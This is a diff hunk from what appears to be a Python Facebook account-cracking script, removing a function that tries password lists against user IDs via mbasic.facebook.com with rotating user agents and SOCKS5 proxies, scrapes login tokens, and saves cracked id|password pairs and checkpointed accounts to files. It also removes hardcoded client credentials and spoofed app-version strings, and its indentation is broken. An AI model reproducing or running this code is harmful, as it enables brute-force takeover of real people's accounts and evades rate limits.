@@ -521,68 +521,6 @@ def m2(ids,passlist):
                 loop+=1
         except Exception as e:
                 pass
-def m3(ids,passlist):
-	global loop,oks,cps
-	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.NOOB\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
-	session = requests.Session()
-		for pas in passlist:
-			ua = random.choice(ua_ios)
-			nip=random.choice(prox)
-			proxs= {'http': 'socks5://'+nip}
-			
-			session.headers.update({"Host":"mbasic.facebook.com", "content-type":"application/x-www-form-urlencoded","upgrade-insecure-requests": "1", "user-agent": ua, "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"})
-			getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head,proxies=proxs)
-			AXI=session.cookies.get_dict().keys()
-			if "c_user" in AXI:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				
-				print('\033[1;92m[ZEE-OK] '+ids+' | '+pas+'\033[1;32m')
-				open('/sdcard/ZEE-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in AXI:
-				if 'y' in pcp:
-					
-					print('\33[1;31m[ZEE-CP] '+ids+' | '+pas+'\33[0;97m')
-					open('/sdcard/ZEE-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-client_id = '6628568379'
-client_secrets = 'c1e620fa708a1d5696fb991c1bde5662'
-version = str(random.randrange(8,15))
-osv = str(random.randrange(1,9))
-abv = ['A','B','C']
-                
-if '8' in version:
-    ipsw = '12'+random.choice(abv)+str(random.randint(11,99))
-elif '9' in version:
-    ipsw = '13'+random.choice(abv)+str(random.randint(11,99))
-elif '10' in version:
-    ipsw = '14'+random.choice(abv)+str(random.randint(11,99))
-elif '11' in version:
-    ipsw = '15'+random.choice(abv)+str(random.randint(11,99))
-elif '12' in version:
-    ipsw = '16'+random.choice(abv)+str(random.randint(11,99))
-elif '13' in version:
-    ipsw = '17'+random.choice(abv)+str(random.randint(11,99))
-elif '14' in version:
-    ipsw = '18'+random.choice(abv)+str(random.randint(11,99))
-elif '15' in version:
-    ipsw = '19'+random.choice(abv)+str(random.randint(11,99))
-application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))
-application_version_code=str(random.randint(000000000,999999999))
-ua_ios = 'Mozilla/5.0 (Linux; Android 10; JSN-L21 Build/HONORJSN-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104;]'
 def ffb(ids,names,passlist):
 	global loop,oks,cps
 	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.ZEE\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
